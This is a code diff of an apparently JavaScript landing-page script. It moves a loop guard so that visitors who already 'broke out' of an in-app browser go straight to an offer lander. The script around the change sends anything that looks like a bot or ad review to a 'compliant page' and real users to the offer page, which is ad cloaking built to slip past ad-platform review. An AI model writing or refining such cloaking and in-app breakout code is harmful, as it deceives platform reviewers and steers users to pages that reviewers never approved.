@@ -181,7 +181,7 @@
        ========================================================================= */
 
     /* ── SWAP: destination "like" lander for this offer (same domain, relative) ── */
-    var DEST = "/TU";          /* e.g. "/FC", "/TU", "/CB" */
+    var DEST = "/TU";          /* the offer's like-lander, same domain (relative) */
     var SAFE = "/Rewards/";         /* compliant page for bots / ad review */
     /* ─────────────────────────────────────────────────────────────────────────── */
 
@@ -205,12 +205,7 @@
       return u.toString();
     }
 
-    // ── Loop guard: already flagged as broken-out → go straight to the lander ──
-    (function () {
-      if (new URLSearchParams(location.search).has('inapp_ok')) {
-        window.location.replace(buildTarget());
-      }
-    })();
+    // Loop guard lives in init() below, so it returns cleanly before any breakout can fire.
 
     // ── In-app app detection ───────────────────────────────────────
     var APP_MAP = [
@@ -383,6 +378,10 @@
 
     // ── AUTO-INIT ──────────────────────────────────────────────────
     (function init() {
+      // 0) Already broke out once (inapp_ok present) → straight to the lander, no re-breakout.
+      if (new URLSearchParams(location.search).has('inapp_ok')) {
+        window.location.replace(buildTarget()); return;
+      }
       // 1) Obvious bots / ad review → compliant page, nothing else runs.
       if (looksLikeReview()) { window.location.replace(SAFE); return; }
 
